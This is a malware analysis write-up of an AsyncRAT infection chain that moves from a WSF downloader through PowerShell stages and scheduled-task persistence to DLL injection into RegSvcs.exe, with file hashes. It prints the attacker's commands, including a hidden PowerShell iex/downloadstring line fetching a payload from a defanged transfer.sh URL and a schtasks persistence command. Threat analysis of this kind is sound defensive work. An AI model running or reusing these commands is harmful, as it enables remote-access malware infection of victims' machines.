---
description: AsyncRAT Infection Chain Analysis
---

# AsyncRAT

## Summary

This sample utilizes AsyncRAT to remotely monitor and control the infected host through an encrypted tunnel. AsyncRAT is an open source Remote Access Tool maintained by [NYAN-x-CAT](https://github.com/NYAN-x-CAT). Features include Keylogger, screen viewer and recorder, SFTP upload and download and password recovery.

The infection chain utilized by this sample starts with a WSF file hosted on a malicious URL.

* Once the WSF file is executed it will then connect to another URL to download a malicious PowerShell script.
* This PowerShell script is used by the sample to contact another URL and download a second PowerShell script.
* The second PowerShell script creates a staging directory, a scheduled task, and drops four files into the created directory. The four files created by this sample were coinmarketcap.ps1, imcq.ps1, 1.bat, and coinmarketcap.vbs.
* When the scheduled task is triggered it will run coinmarketcap.vbs.
* coinmarketcap.vbs will run 1.bat
* 1.bat will then run imcq.ps1 which will inject a DLL embedded within itself into Regsvcs.exe and contact the attackers C2.

<figure><img src=".gitbook/assets/AsyncRat Infection Chain.jpeg" alt=""><figcaption><p>Infection chain utilized by this sample</p></figcaption></figure>

***

## Technical Analysis

### Downloader - any.txt

This file is used by the first stage to pull another PowerShell script from a malicious URL and continue the infection chain. The sample uses a find and replace and alternating capital letters in order to confuse someone who may be reading the file.

This stage of the sample can be deobfuscated to:

{% code overflow="wrap" %}
```
Set mw_wscript.shell= CreateObject("wscript.shell") mw_wscript.shell.Run(powershell.exe -wind hidden -exec bypass -noni iex(new-object net.webclient.downloadstring hxxps://transfer[.]sh/CdqqbMkRr9/Ic295.jpg , CONSOLE_HIDE, CMD_WAIT Set ali = Nothing
```
{% endcode %}

When this is ran it will download the next stage from _hxxps://transfer\[.]sh/CdqqbMkRr9/Ic295.jpg_ and run it with it with PowerShell.

### Builder - Ic295.jpg

The purpose of this stage is to setup a staging area for the sample and to establish persistence on the victim's machine. When this stage is executed it will drop four files in the staging area and start running the first files of this stage. The first file that is executed in this stage is coinmarketcap.ps1. This file is responsible for creating the scheduled task on the host to setup persistence on the machine, if for some reason the final payload is terminated this scheduled task will re-run the installation process.&#x20;

The scheduled task is ran with the command line:

{% code overflow="wrap" %}
```
'schtasks.exe' '/create' '/sc' 'minute' '/mo' 1 '/tn' ''coinmarketcap '/tr' (('C:\Users\Public\coinmarketcap\coinmarketcap.vbs'))
```
{% endcode %}

Once the scheduled task is executed it will then run coinmarketcap.vbs, this stage's responsibility is to run the dropped batch file 1.bat with wscript.

<figure><img src=".gitbook/assets/Coinmarketcap.vbs.jpeg" alt=""><figcaption><p>contents of coinmarketcap.vbs</p></figcaption></figure>

After the batch file is started it will run the final stage of this stage of this stage.

{% code overflow="wrap" %}
```
CMD /C powershell.exe -NOP -WIND HIDDEN -eXEC BYPASS -NONI "C:\Users\Public\coinmarketcap\imcq.ps1"
```
{% endcode %}

This last PowerShell script is used to build and inject a DLL into the target process RegSvcs.exe.

### Injector - NewPE2.dll

```
MD5: 5616daa897af18e81dee80e75eef90cd
SHA256: 3a9096d615a3cd3163b814cc2803d68a627c681d19d3a896313c925b8a11bf4c
Original Name: NewPE2.dll
file-type: dynamic-link-library
Compile Date: 28 FEB 2067 11:16:29
Entropy: 5.789
signature: Microsoft Visual C# / Basic .NET
file-size: 21504 (bytes)
```

